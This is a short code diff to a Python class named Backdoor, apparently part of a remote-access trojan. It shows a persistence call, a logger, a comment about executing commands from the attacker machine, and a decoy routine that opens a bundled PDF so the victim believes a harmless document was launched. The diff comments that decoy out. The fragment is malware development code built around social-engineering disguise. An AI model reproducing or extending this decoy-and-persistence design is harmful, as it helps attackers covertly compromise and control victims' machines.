@@ -40,7 +40,7 @@ class Backdoor:
     # Initialize the socket connection via constructor with the given ip and port value
     def __init__(self):
         self.__become_persistent()
-        self.__open_pdf()
+        # self.__open_facade()
         self.connection = None
         self.logger = Logger(self.queue)
         self.create_workers()
@@ -210,10 +210,13 @@ class Backdoor:
         except Exception as msg:
             print("Persistence failed" + str(msg))
 
-    def __open_pdf(self):
-        if ('--startup' in sys.argv) is False:
-            file_name = sys._MEIPASS + "\\talks-of-tedexe.pdf"
-            subprocess.Popen(file_name, shell=True)
+    # def __open_facade(self):
+    #     try:
+    #         if ('--startup' in sys.argv) is False:
+    #             file_name = sys._MEIPASS + "\\talks-of-tedexe.pdf"
+    #             subprocess.Popen(file_name, shell=True)
+    #     except:
+    #         pass
 
     # Here we are waiting commands from attacker machine in an infinite loop
     def command_executor(self):
